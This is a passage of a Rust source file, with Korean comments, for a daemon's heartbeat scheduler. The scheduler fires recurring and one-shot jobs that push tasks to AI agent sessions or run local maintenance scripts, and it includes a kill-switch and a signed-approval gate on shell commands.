//! Heartbeat 스케줄러 — 24/365 상주 데몬이 정해진 시각에 반복 업무를 발화한다.
//! cron과의 차이: 살아있는 AI 세션의 stdin에 자연어 과업을 push하고,
//! 대상 역할이 부재하면 launch-agent로 깨워서 주입한다.

use crate::state::{now_epoch, state_dir, Daemon, HideConsole};
use chrono::{Datelike, Local, NaiveTime, TimeZone};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

const TICK_SECS: u64 = 30;
/// 예정 시각보다 이만큼 늦게 발견하면 발화하지 않고 missed 처리 (데몬 다운 후 재시작 등)
const MISS_WINDOW_SECS: i64 = 600;
/// 반복(time) + fresh 조합에서 close_after_secs 미설정 시 적용하는 기본 TTL.
/// 매 발화가 유일 역할의 새 surface를 만드는데 회수 트리거가 없으면 24/365 데몬에서
/// surface·roles 맵·PTY fd가 단조 증가한다(원샷+fresh는 1회뿐이나 반복은 무한 누적).
/// close_after_secs를 명시하면 그 값이 우선 — 기본은 주입 과업이 끝날 여유를 둔 보수적 상한.
const FRESH_RECURRING_DEFAULT_TTL_SECS: u64 = 1800;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LaunchSpec {
    pub role: String,
    pub agent: String,
    #[serde(default)]
    pub cwd: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Job {
    pub id: String,
    /// "HH:MM" (로컬 시간). 원샷(at)·주기(every_minutes) job은 생략.
    #[serde(default)]
    pub time: Option<String>,
    /// 주기 발화 간격(분). 설정 시 time·at 대신 마지막 발화 후 N분마다 반복 발화한다
    /// (절대지침: master 5분 주기 진행% 보고의 하트비트). 0·미설정은 비활성.
    #[serde(default)]
    pub every_minutes: Option<u64>,
    /// T3-10 원샷: 절대 epoch 발화 시각 — 처리(발화/missed) 후 job은 파일에서 제거된다
    #[serde(default)]
    pub at: Option<i64>,
    /// T3-10: fresh surface를 발화 후 N초 뒤 자동 close (원샷+fresh의 surface 누수 차단)
    #[serde(default)]
    pub close_after_secs: Option<u64>,
    /// 비어 있으면 매일. ["mon","tue",...]
    #[serde(default)]
    pub days: Vec<String>,
    /// "push" | "command"
    pub action: String,
    #[serde(default)]
    pub to: Option<String>,
    #[serde(default)]
    pub text: Option<String>,
    /// push 액션 전용: 설정 시 이 셸 명령을 데몬이 실행해 그 stdout을 push 텍스트로 쓴다
    /// (결정론 환원: 진행% 산출 같은 도구 출력을 master 앞에 직접 놓아, master가 산출 주체가
    /// 아니라 전달자가 되게 한다). text와 함께 설정되면 text_command 우선.
    #[serde(default)]
    pub text_command: Option<String>,
    #[serde(default)]
    pub command: Option<String>,
    /// push 대상 역할 부재 시: "launch" | "skip"(기본)
    #[serde(default)]
    pub if_absent: Option<String>,
    /// true면 매 발화마다 새 surface를 기동해 주입 (권한·컨텍스트 상속 차단 — cron 격리)
    #[serde(default)]
    pub fresh: bool,
    #[serde(default)]
    pub launch: Option<LaunchSpec>,
}

/// schedule_state.json 영속 스키마 버전 — 추가-전용 마이그레이션의 기준점.
const SCHEDULE_STATE_VERSION: u32 = 1;

#[derive(Debug, Default, Serialize, Deserialize)]
struct ScheduleState {
    /// 영속 스키마 버전. 구파일(필드 부재)은 serde default로 0으로 로드된다. 향후 필드 변경 시
    /// 이 버전을 올리고 변환기를 추가하라 — 기존 필드는 삭제·개명하지 말고 옆에 추가(추가-전용).
    #[serde(default)]
    schema_version: u32,
    /// job id → 마지막으로 처리(발화 또는 missed)한 예정 시각 epoch
    last_fired: HashMap<String, i64>,
}

pub fn schedule_path() -> PathBuf {
    cys::pack::pack_dir().join("schedule.json")
}

/// ★B2-1(W3): built-in 잡 정의 버전. **기존 잡의 내용이 바뀔 때만** 올린다 — 부트 ensure 가 구버전
/// 항목을 통째로 교체하는 기준이기 때문이다.
/// ⚠**잡 추가에는 올리지 마라**(2026-07-26 적대적 성찰): 신규 id 는 apply_builtin_jobs 의 `None →
/// append` 경로(부재=생성)를 타는데 그 경로는 버전을 보지 않는다. 반면 버전을 올리면 **기존 built-in
/// 잡 전체**가 `cur_ver != want_ver` 로 판정돼 사용자 파일에서 통째로 교체된다 — 사용자가 주기 등을
/// 손봤다면 조용히 소실된다(우리가 근절하려는 '사용자 의도 무언 파괴' 결함 그 자체).
/// 회귀 핀: `new_builtin_job_does_not_replace_existing_builtin_jobs`.
const BUILTIN_JOBS_VERSION: u64 = 1;

/// built-in 잡 정의(phoenix 인프라 + learn 학습 루프) — 팩 schedule.json 배달이 아니라 코드가 소유한다
/// (schedule.json 이 user-owned 로 전환돼 팩 강제갱신이 사용자 잡을 보존하므로, built-in 잡 진화는 이 코드가
/// 담당). 각 항목에 `_builtin`/`_builtin_version` 마커를 달아 ensure 가 id 로 upsert·버전 대조한다(Job 의
/// 미지 필드는 serde 가 무시). text_command 는 R-CLI-4 게이트가 이 코드 정의와의 정확 일치로 신뢰한다.
fn builtin_jobs() -> Vec<serde_json::Value> {
    vec![
        json!({
            "id": "phoenix-snapshot-6h",
            "every_minutes": 360,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] phoenix 세대 스냅샷 정기화(6h·P2-4) — 손상 치유 소스 최신화.\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" snapshot 2>&1 | tail -3",
            "_builtin": "phoenix",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        json!({
            "id": "phoenix-drill-weekly",
            "every_minutes": 10080,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] phoenix 주간 격리 드릴(원자성·중단내성 self-test·라이브 무접촉) — 실전이 첫 테스트인 상태 종료(축E E2).\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" self-test 2>&1 | tail -5",
            "_builtin": "phoenix",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // (learn gaps C12③) RSI 학습 루프 정기 잡 — G1 audit 구동자(일 1회)·G5 fleet digest(주 1회).
        // CYS_ROUND_DIR 핀: 데몬 cwd 의존(_round) 대신 canonical ~/.cys/state/learn 고정
        // (launchd cwd=/ 사고 이력·설계안 §3 G5) — 데몬 learn_state_dir 규약과 동일(env 설정 시 승계).
        json!({
            "id": "learn-ttl-audit",
            "every_minutes": 1440,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] RSI 학습 TTL 감사(일 1회·G1) — 만기 tombstone·재검 wakeup·lapse 강등·refs 대조의 결정론 산출이다. hard-fail 항목은 능동 조치하라.\\n'; CYS_ROUND_DIR=\"${CYS_ROUND_DIR:-$HOME/.cys/state}\" JAVIS_ROOT=\"${JAVIS_ROOT:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_learn.py\" audit --json",
            "_builtin": "learn",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ★B4(리뷰 수렴): javis_deadletter 는 **호출자가 0이었다** — 데몬은 dead-letter 원장을
        // 성실히 쌓는데 그걸 사람이 읽는 곳으로 옮기는 도구가 아무 데서도 불리지 않았다
        // (무손실의 절반만 구현된 상태: 잃지는 않지만 아무도 못 본다). 6시간 주기로 전사한다.
        // exit 5=무작업(정상·조용) · 4=전사됐으나 digest 실패(degraded) · 0=신규 전사.
        // ⚠text_command 는 R-CLI-4 게이트가 이 코드 정의와 **정확 일치**로 신뢰한다 —
        //   schedule.json 사본과 자구 하나까지 같아야 한다.
        json!({
            "id": "deadletter-transcribe-6h",
            "every_minutes": 360,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] dead-letter 원장 전사(6h·C7) — 큐에서 제거된 전 메시지의 무손실 원장을 사람이 읽는 md 로 옮긴다. 신규 0건이면 조용히 끝난다.\\n'; JAVIS_ROOT=\"${JAVIS_ROOT:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_deadletter.py\" 2>&1 | tail -20",
            "_builtin": "queue",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        json!({
            "id": "fleet-digest",
            "every_minutes": 10080,
            "action": "push",
            "to": "master",
            "if_absent": "skip",
            "text_command": "printf '[heartbeat] 주간 fleet digest(G5) — 채택 학습물·사후 효과(ROI)·게이트 지출의 결정론 read-only 집계다. 수치 불변으로 보고하라. 추천 0건 지속=게이트 비용 재조정 검토 트리거.\\n'; CYS_ROUND_DIR=\"${CYS_ROUND_DIR:-$HOME/.cys/state}\" python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_fleet_report.py\" --days 7 2>&1 | tail -40",
            "_builtin": "learn",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ★편성 재시도 잡(2026-07-26 · 배너 불멸 2단계) — **배송 경로 수리**.
        // 팩 schedule.json 은 user-owned(`cys pack-ownership schedule.json` = user)라 팩 업데이트가
        // 절대 덮지 않는다 → 이 잡을 팩 파일에만 두면 **기존 사용자에게 영영 도달하지 못한다**(신규
        // 설치 전용 반쪽 수리). 코드 소유 built-in 으로 옮겨 데몬 부트 ensure 가 id upsert 로 배달한다.
        // 배송 경로는 `None → append`(부재=생성)이며 **버전 대조를 타지 않는다** — 그래서 이 잡을
        // 추가하면서 BUILTIN_JOBS_VERSION 을 올리지 않는다(올리면 기존 built-in 잡이 전부 교체돼
        // 사용자 커스터마이즈가 조용히 소실된다 · 상수 주석 참조).
        // 역할: 편성이 pending(자원·CLI 미설치)으로 멈춘 레인을 10분마다 재시도해 완결로 승급시키고,
        // 그 전이에서 배너 소멸 신호(feed formation-complete)를 발행한다.
        // ⚠`--force-surface` 를 붙이지 마라 — 주기 잡의 강제 표면화는 매 틱 토스트 스팸이다
        //   (강제 표면화는 앱 부트 레인 전용 · src-tauri fire_formation_ensure).
        json!({
            "id": "formation-ensure-10min",
            "every_minutes": 10,
            "action": "command",
            "command": "python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_formation.py\" ensure ${CYS_SOCKET:+--socket \"$CYS_SOCKET\"} --json",
            "if_absent": "skip",
            "_builtin": "formation",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
    ]
}

/// built-in 잡을 jobs 배열에 idempotent upsert(순수 — 회귀 핀). id 로 대조:
///   · 부재 → append(생성)
///   · 존재 + built-in 마커(`_builtin`이 코드 정의와 일치: "phoenix"·"learn"·"queue"·"formation") → 버전 상이 시 교체(갱신)·동버전 무접촉
///   · 존재 + **마커 없음/불일치(사용자가 그 id 선점)** → ★codex W3: 교체 금지(사용자 잡 보존)·경고(conflicts 반환)
/// 반환 (changed, conflicts) — conflicts=사용자가 reserved id 를 쓴 잡 id 목록(호출측 loud 경고).
fn apply_builtin_jobs(jobs: &mut Vec<serde_json::Value>) -> (bool, Vec<String>) {
    let mut changed = false;
    let mut conflicts = Vec::new();
    for bj in builtin_jobs() {
        let id = match bj.get("id").and_then(|v| v.as_str()) {
            Some(s) => s.to_string(),
            None => continue,
        };
        let want_ver = bj.get("_builtin_version").and_then(|v| v.as_u64()).unwrap_or(0);
        match jobs
            .iter()
            .position(|j| j.get("id").and_then(|v| v.as_str()) == Some(id.as_str()))
        {
            Some(pos) => {
                // ★codex W3 major: built-in 마커(_builtin)가 코드 정의(bj)의 마커와 일치하는 항목만
                //   우리 소유 → 버전 갱신. 마커 없는/다른 동명 항목은 사용자가 그 id 를 선점한 것
                //   → 교체 금지+conflict 경고(user 잡 보존). (마커군: "phoenix"=인프라·"learn"=학습 루프·
                //   "queue"=큐 역압 운영·"formation"=편성 재시도)
                let want_marker = bj.get("_builtin").and_then(|v| v.as_str());
                let is_ours = want_marker.is_some()
                    && jobs[pos].get("_builtin").and_then(|v| v.as_str()) == want_marker;
                if !is_ours {
                    conflicts.push(id);
                    continue;
                }
                let cur_ver = jobs[pos].get("_builtin_version").and_then(|v| v.as_u64());
                if cur_ver != Some(want_ver) {
                    jobs[pos] = bj; // built-in 구버전 → 갱신
                    changed = true;
                }
                // 존재+동버전 = 무접촉(중복 생성 0)
            }
            None => {
                jobs.push(bj); // 부재 → 생성
                changed = true;
            }
        }
    }
    (changed, conflicts)
}

/// ★B2-1(W3): 데몬 부트 시 built-in phoenix 잡을 schedule.json 에 idempotent 하게 보장한다. schedule.json 은
/// user-owned(사용자 `cys schedule add` 잡 보존)이라 팩 배달로는 built-in 잡을 갱신할 수 없다 — 코드가 upsert 한다.
/// 파일 부재=빈 골격 생성 · 손상(파싱 실패)=무접촉(load_jobs 의 격리 경로가 별도 처리 — 여기서 덮어써 사용자 잡을
/// 잃지 않는다) · 변경 있을 때만 원자적 재기록(핫 리로드 torn read 회피).
pub fn ensure_builtin_jobs() {
    let path = schedule_path();
    let mut root: serde_json::Value = match std::fs::read_to_string(&path) {
        Ok(c) => match serde_json::from_str(&c) {
            Ok(v) => v,
            Err(e) => {
                // 손상 — 무접촉(사용자 잡 보존 우선). load_jobs 가 격리+loud 신호를 낸다.
                eprintln!("[cysd] ensure_builtin_jobs: schedule.json 파싱 실패({e}) — 무접촉(손상은 load_jobs 격리 소관)");
                return;
            }
        },
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => json!({"jobs": []}),
        Err(e) => {
            eprintln!("[cysd] ensure_builtin_jobs: schedule.json 읽기 실패({e}) — 무접촉");
            return;
        }
    };
    if !root.is_object() {
        eprintln!("[cysd] ensure_builtin_jobs: schedule.json 최상위가 object 아님 — 무접촉");
        return;
    }
    // jobs 배열 확보(부재/비배열이면 빈 배열로 정규화 — 다른 키는 보존).
    if !root.get("jobs").map(|j| j.is_array()).unwrap_or(false) {
        root.as_object_mut()
            .unwrap()
            .insert("jobs".to_string(), json!([]));
    }
    let arr = root.get_mut("jobs").and_then(|j| j.as_array_mut()).unwrap();
    let (changed, conflicts) = apply_builtin_jobs(arr);
    for id in &conflicts {
        eprintln!(
            "[cysd] ensure_builtin_jobs: 사용자 잡이 예약 id '{id}' 를 선점 — built-in 갱신 skip(사용자 잡 보존). \
             built-in 기능을 원하면 사용자 잡을 다른 id 로 옮기라."
        );
    }
    if changed {
        match serde_json::to_string_pretty(&root) {
            Ok(s) => {
                let tmp = path.with_extension("json.tmp");
                if std::fs::write(&tmp, s).is_ok() && std::fs::rename(&tmp, &path).is_ok() {
                    eprintln!("[cysd] ensure_builtin_jobs: built-in phoenix 잡 보장(생성/갱신) 완료");
                } else {
                    eprintln!("[cysd] ensure_builtin_jobs: schedule.json 원자쓰기 실패");
                }
            }
            Err(e) => eprintln!("[cysd] ensure_builtin_jobs: 직렬화 실패({e})"),
        }
    }
}

fn state_path(daemon: &Daemon) -> PathBuf {
    state_dir(&daemon.socket_path).join("schedule_state.json")
}

/// 손상 영속 파일 격리 — 조용히 기본값으로 덮어쓰지 않고 `<name>.corrupt-<epoch>`로 옮긴다.
/// 데이터 보존 + 복원 가능 + loud 신호(호출부 eprintln). rename 성공 시 백업 경로를 반환한다.
/// 부재 파일(첫 가동)은 정상이므로 격리 대상이 아니다 — 호출부가 NotFound를 먼저 분기한다.
fn quarantine_corrupt(path: &std::path::Path) -> Option<PathBuf> {
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let backup = path.with_file_name(format!("{name}.corrupt-{}", now_epoch() as u64));
    std::fs::rename(path, &backup).ok().map(|_| backup)
}

pub fn load_jobs() -> Vec<Job> {
    let path = schedule_path();
    let content = match std::fs::read_to_string(&path) {
        Ok(c) => c,
        // 부재 = 정상(스케줄 미설정). 빈 스케줄로 조용히 진행한다.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Vec::new(),
        Err(e) => {
            eprintln!(
                "[cysd] schedule.json 읽기 실패({}): {e} — 빈 스케줄로 진행",
                path.display()
            );
            return Vec::new();
        }
    };
    // 존재하나 파싱 불가 = 데이터 손상. 조용히 빈 스케줄로 대체하면 24/365 데몬의 전 하트비트가
    // 신호 0으로 소실된다(헌장 복원 불변식 모순). 손상본을 격리하고 loud 신호를 남긴다.
    let root: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            let note = match quarantine_corrupt(&path) {
                Some(b) => format!("손상본을 {}로 격리(데이터 보존)", b.display()),
                None => "손상본 격리 실패".to_string(),
            };
            eprintln!("[cysd] schedule.json 파싱 실패: {e} — {note}; 빈 스케줄로 진행");
            return Vec::new();
        }
    };
    match root.get("jobs") {
        None => Vec::new(), // jobs 키 부재 = 빈 스케줄(정상)
        Some(j) => match serde_json::from_value::<Vec<Job>>(j.clone()) {
            Ok(v) => v,
            Err(e) => {
                // root는 유효 JSON이나 jobs 스키마 불일치 — 전체 격리는 않되(다른 키 보존 가능)
                // loud 신호로 무음 소실을 막는다. 스키마 점검이 필요한 운영 신호.
                eprintln!(
                    "[cysd] schedule.json 'jobs' 역직렬화 실패: {e} — 빈 스케줄(스키마 점검 필요)"
                );
                Vec::new()
            }
        },
    }
}

fn load_state(daemon: &Daemon) -> ScheduleState {
    let path = state_path(daemon);
    let content = match std::fs::read_to_string(&path) {
        Ok(c) => c,
        // 부재 = 정상(최초 가동). 기본 상태로 시작한다.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return ScheduleState::default(),
        Err(e) => {
            eprintln!(
                "[cysd] schedule_state.json 읽기 실패({}): {e} — 기본 상태로 진행",
                path.display()
            );
            return ScheduleState::default();
        }
    };
    match serde_json::from_str::<ScheduleState>(&content) {
        Ok(s) => s,
        Err(e) => {
            // 손상 fire-state를 조용히 default로 대체하면 last_fired 소실 → 전 job 재발화.
            // 격리 + loud로 운영자가 인지하게 한다(재발화는 보고성 job엔 무해하나 신호는 남긴다).
            let note = match quarantine_corrupt(&path) {
                Some(b) => format!("손상본을 {}로 격리", b.display()),
                None => "손상본 격리 실패".to_string(),
            };
            eprintln!("[cysd] schedule_state.json 파싱 실패: {e} — {note}; 기본 상태로 진행");
            ScheduleState::default()
        }
    }
}

fn save_state(daemon: &Daemon, state: &ScheduleState) {
    if let Ok(s) = serde_json::to_string_pretty(state) {
        let _ = std::fs::write(state_path(daemon), s);
    }
}

/// 주기 job 발화 판정 — 순수 함수(회귀 핀). 마지막 발화 후 every_minutes분 경과 시 true.
/// every_minutes None·0은 비활성(상시발화 방지). last_fired=0(최초)는 epoch 차가 커 즉시 발화.
fn interval_due(every_minutes: Option<u64>, last_fired: i64, now_ts: i64) -> bool {
    match every_minutes {
        Some(m) if m > 0 => now_ts - last_fired >= (m as i64) * 60,
        _ => false,
    }
}

/// 해당 날짜가 job의 실행 요일인가 + 그 날짜의 예정 시각(epoch)을 계산.
/// DST 모호/비존재 시각은 earliest로 보정 — 해당일 job이 무음 소멸하지 않는다.
fn schedule_for(job: &Job, date: chrono::NaiveDate) -> Option<i64> {
    if !job.days.is_empty() {
        let dow = match date.weekday() {
            chrono::Weekday::Mon => "mon",
            chrono::Weekday::Tue => "tue",
            chrono::Weekday::Wed => "wed",
            chrono::Weekday::Thu => "thu",
            chrono::Weekday::Fri => "fri",
            chrono::Weekday::Sat => "sat",
            chrono::Weekday::Sun => "sun",
        };
        if !job.days.iter().any(|d| d.eq_ignore_ascii_case(dow)) {
            return None;
        }
    }
    let t = NaiveTime::parse_from_str(job.time.as_deref()?, "%H:%M").ok()?;
    let dt = date.and_time(t);
    let local = Local.from_local_datetime(&dt);
    local
        .single()
        .or_else(|| local.earliest())
        .map(|d| d.timestamp())
}

pub fn spawn_scheduler(daemon: Arc<Daemon>) {
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(TICK_SECS)).await;
            // 패닉 격리: 한 틱의 패닉이 scheduler 태스크를 죽여 하트비트 발화가
            // 데몬 수명 내내 조용히 멈추는 것을 막는다. (fire는 별도 태스크라 자체 격리)
            let tick = std::panic::AssertUnwindSafe(|| scheduler_tick(&daemon));
            if std::panic::catch_unwind(tick).is_err() {
                daemon.bus.publish(
                    "schedule.tick_panic",
                    "schedule",
                    None,
                    json!({"note": "scheduler tick panicked; continuing next tick"}),
                );
            }
        }
    });
}

/// scheduler 루프의 동기 틱 본문 — 패닉 격리 경계 안에서 호출된다.
fn scheduler_tick(daemon: &Arc<Daemon>) {
    // T4-15 kill-switch: pause 중에는 발화 동결 (재개 후 600초 초과분은 missed 처리)
    if daemon.paused.load(std::sync::atomic::Ordering::Relaxed) {
        return;
    }
    let jobs = load_jobs(); // 핫 리로드: CLI가 schedule.json만 고치면 됨
    if jobs.is_empty() {
        return;
    }
    let now = Local::now();
    let now_ts = now.timestamp();
    let mut state = load_state(daemon);
    state.schema_version = SCHEDULE_STATE_VERSION; // 구파일(0) → 현재 버전 스탬프(다음 save 시 영속)
    let mut dirty = false;
    let today = now.date_naive();
    for job in jobs {
        // 주기(every_minutes) job: 마지막 발화 후 N분 경과 시 반복 발화 (master 5분 보고 하트비트).
        // at·time보다 먼저 평가하고, 처리 후 다음 job으로 (배타).
        // 재시작 안전성: last_fired는 발화 직후 기록되고 dirty 시 save_state로 영속된다.
        // save_state 직전 비정상 종료 시 재시작 후 1회 추가 발화가 가능하나, 보고성 job은
        // 중복 발화를 허용한다(누락이 더 해롭다 — '보고가 한 번 더'는 무해).
        if job.every_minutes.is_some() {
            let last = state.last_fired.get(&job.id).copied().unwrap_or(0);
            if interval_due(job.every_minutes, last, now_ts) {
                state.last_fired.insert(job.id.clone(), now_ts);
                dirty = true;
                let d = Arc::clone(daemon);
                let j = job.clone();
                tokio::spawn(async move { fire(d, j).await });
            }
            continue;
        }
        // T3-10 원샷(at) job: 도달 시 1회 발화 후 파일에서 제거
        if let Some(at) = job.at {
            if now_ts < at {
                continue;
            }
            if state.last_fired.get(&job.id).copied().unwrap_or(0) >= at {
                continue;
            }
            state.last_fired.insert(job.id.clone(), at);
            dirty = true;
            if now_ts - at > MISS_WINDOW_SECS {
                daemon.bus.publish(
                    "schedule.missed",
                    "schedule",
                    None,
                    json!({"job_id": job.id, "scheduled_at": at, "late_secs": now_ts - at}),
                );
            } else {
                let d = Arc::clone(daemon);
                let j = job.clone();
                tokio::spawn(async move { fire(d, j).await });
            }
            remove_job_from_file(&job.id);
            continue;
        }
        // 어제 인스턴스도 평가 — 자정 경계에서 전날 미처리분이
        // fire도 schedule.missed도 없이 무음 소멸하는 것을 막는다
        let mut dates = vec![today];
        if let Some(yesterday) = today.pred_opt() {
            dates.insert(0, yesterday);
        }
        for date in dates {
            let Some(sched_ts) = schedule_for(&job, date) else {
                continue;
            };
            if now_ts < sched_ts {
                continue;
            }
            if state.last_fired.get(&job.id).copied().unwrap_or(0) >= sched_ts {
                continue; // 이미 처리
            }
            state.last_fired.insert(job.id.clone(), sched_ts);
            dirty = true;
            if now_ts - sched_ts > MISS_WINDOW_SECS {
                daemon.bus.publish(
                    "schedule.missed",
                    "schedule",
                    None,
                    json!({"job_id": job.id, "scheduled_at": sched_ts,
                                   "late_secs": now_ts - sched_ts}),
                );
                continue;
            }
            let d = Arc::clone(daemon);
            let job = job.clone();
            tokio::spawn(async move { fire(d, job).await });
        }
    }
    if dirty {
        save_state(daemon, &state);
    }
}

/// T3-10: 처리 완료된 원샷 job을 schedule.json에서 제거 (영구 잔존 차단)
fn remove_job_from_file(job_id: &str) {
    let path = schedule_path();
    let Ok(content) = std::fs::read_to_string(&path) else {
        return;
    };
    let Ok(mut root) = serde_json::from_str::<serde_json::Value>(&content) else {
        return;
    };
    if let Some(arr) = root["jobs"].as_array_mut() {
        arr.retain(|j| j["id"].as_str() != Some(job_id));
    }
    let _ = std::fs::write(
        &path,
        serde_json::to_string_pretty(&root).unwrap_or_default(),
    );
}

/// 즉시 발화 (CLI `schedule run-now` — 검증용, last_fired 갱신 없음)
pub fn run_now(daemon: &Arc<Daemon>, job_id: &str) -> Result<(), String> {
    // T4-15 kill-switch: pause 중에는 즉발도 동결 — scheduler_tick과 동일한 게이트.
    // run_now는 fire()로 동일한 스케줄 발화(에이전트 stdin 주입·fresh surface 기동)를
    // 수행하므로, 이 경로만 게이트가 없으면 kill-switch가 비대칭으로 뚫린다.
    // RPC 호출이라 무음 return 대신 거절 사유를 caller에 알린다.
    if daemon.paused.load(std::sync::atomic::Ordering::Relaxed) {
        return Err("paused: kill-switch engaged (system.resume to re-enable firing)".to_string());
    }
    let job = load_jobs()
        .into_iter()
        .find(|j| j.id == job_id)
        .ok_or_else(|| format!("no job '{job_id}' in {}", schedule_path().display()))?;
    let d = Arc::clone(daemon);
    tokio::spawn(async move { fire(d, job).await });
    Ok(())
}

async fn fire(daemon: Arc<Daemon>, job: Job) {
    let result = match job.action.as_str() {
        "push" => fire_push(&daemon, &job).await,
        "command" => fire_command(&daemon, &job).await,
        other => Err(format!("unknown action '{other}'")),
    };
    match result {
        Ok(detail) => daemon.bus.publish(
            "schedule.fired",
            "schedule",
            None,
            json!({"job_id": job.id, "action": job.action, "detail": detail, "at": now_epoch()}),
        ),
        Err(e) => daemon.bus.publish(
            "schedule.error",
            "schedule",
            None,
            json!({"job_id": job.id, "error": e}),
        ),
    }
}

/// fresh surface를 발화 후 자동 close하기까지의 TTL(초)을 결정한다.
/// - close_after_secs 명시 → 그 값 우선(0 포함 — 운영자 의도 존중)
/// - 미설정 + 반복 job(time 또는 every_minutes) → 누수 차단 기본 TTL (반복 발화는 surface가
///   단조 누적되므로 회수 트리거 부재 시 자동 close 필요). at이 None인 모든 반복형에 적용된다.
/// - 미설정 + 원샷(at) job → None (1회뿐이라 무한 누적 없음 — 기존 동작 보존)
fn effective_close_ttl(job: &Job) -> Option<u64> {
    if let Some(ttl) = job.close_after_secs {
        return Some(ttl);
    }
    if job.at.is_none() {
        return Some(FRESH_RECURRING_DEFAULT_TTL_SECS);
    }
    None
}

/// R-CLI-4: text_command 실행 前 게이트용 — 코드 소유 built-in 잡의 text_command와 정확히
/// 일치하는가(순수·회귀 핀). built-in 문자열이 조금이라도 변조되면 false로 떨어진다.
fn is_trusted_builtin_text_command(cmd: &str) -> bool {
    builtin_jobs()
        .iter()
        .any(|j| j.get("text_command").and_then(|v| v.as_str()) == Some(cmd))
}

/// R-CLI-4: text_command는 데몬이 셸로 실행하므로(schedule.json 편집자 = 임의 셸 실행 벡터) 실행
/// 前 게이트한다. ① 코드 소유 built-in 잡(팩·데몬 저작)의 text_command와 정확 일치 = 신뢰 허용.
/// ② 그 외(사용자·외부 주입·변조된 built-in) = 서명된 승인 레코드(approval.rs) 필요 — 부재 시
/// fail-closed 거부. 서명 시크릿 없이는 레코드 위조 불가라 무게이트 임의 셸 실행을 봉인한다.
fn text_command_allowed(cmd: &str) -> Result<(), String> {
    if is_trusted_builtin_text_command(cmd) {
        return Ok(());
    }
    let Some(secret) = crate::approval::signing_secret() else {
        return Err("text_command 승인 시크릿 부재 — 미승인 셸 실행 거부".into());
    };
    let records = crate::approval::load_records();
    let cwd = std::env::current_dir()
        .ok()
        .map(|p| p.to_string_lossy().to_string());
    if crate::approval::best_match(&records, &secret, cmd, cwd.as_deref(), &[]).is_some() {
        Ok(())
    } else {
        Err(format!(
            "미승인 text_command — built-in 아님·서명 승인 없음(임의 셸 실행 차단): {cmd}"
        ))
    }
}

/// text_command를 셸로 실행해 stdout(trim)을 반환한다 (push 텍스트 산출).
/// 결정론 환원: 진행% 같은 도구 출력을 데몬이 직접 만들어 master 앞에 놓는다.
/// 30초 타임아웃·빈 출력·비정상 종료는 에러 — 잘못된 보고가 무음 전달되지 않는다.
async fn run_text_command(cmd: &str) -> Result<String, String> {
    // R-CLI-4: 무게이트 셸 실행 차단 — built-in 신뢰 또는 서명 승인만 통과.
    text_command_allowed(cmd)?;
    // RC-11: OS별 셸 — Windows는 sh 부재라 heartbeat/report text_command job이 전부 실패했다.
    // fire_command와 동일하게 command_shell()((cmd,/C) on windows) 사용으로 통일.
    let (sh, flag) = command_shell();
    let fut = tokio::process::Command::new(sh)
        .arg(flag)
        .arg(cmd)
        .hide_console()
        .output();
    let out = match tokio::time::timeout(Duration::from_secs(30), fut).await {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => return Err(format!("text_command spawn 실패: {e}")),
        Err(_) => return Err("text_command 30초 타임아웃".into()),
    };
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        return Err(format!(
            "text_command 비정상 종료({:?}): {}",
            out.status.code(),
            err.chars().take(200).collect::<String>()
        ));
    }
    // 성공(exit 0)이면 stdout만 push 텍스트로 쓴다. 보고 도구(javis_report)는 진단·실패도
    // stdout 보고문에 담도록 설계됐으므로(예: "cys status 수집 실패"), 성공 경로 stderr는
    // 부차적이라 무시한다 — 비정상 종료(exit≠0)는 위에서 이미 stderr와 함께 에러로 잡힌다.
    let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if s.is_empty() {
        return Err("text_command 출력이 비어 있다".into());
    }
    Ok(s)
}

async fn fire_push(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
    let to = job.to.as_deref().ok_or("push job missing 'to'")?;
    // text 결정: text_command가 있으면 데몬이 실행해 stdout을 push 텍스트로 쓴다(결정론 환원).
    // 없으면 정적 text. 둘 다 없으면 에러.
    let text: String = if let Some(cmd) = job.text_command.as_deref() {
        run_text_command(cmd).await?
    } else {
        job.text
            .as_deref()
            .ok_or("push job missing 'text' or 'text_command'")?
            .to_string()
    };
    let text = text.as_str();

    // fresh 모드: 살아있는 역할이 있어도 무조건 새 surface 기동 → 그 surface에 직접 주입.
    // 역할명은 유일 접미사로 변형 — 원 역할(예: worker)의 살아있는 주소를 탈취하지 않는다.
    // (지침 주입은 role prefix 매칭이라 worker-fresh-*도 WORKER_DIRECTIVE를 받는다)
    if job.fresh {
        let spec = job
            .launch
            .as_ref()
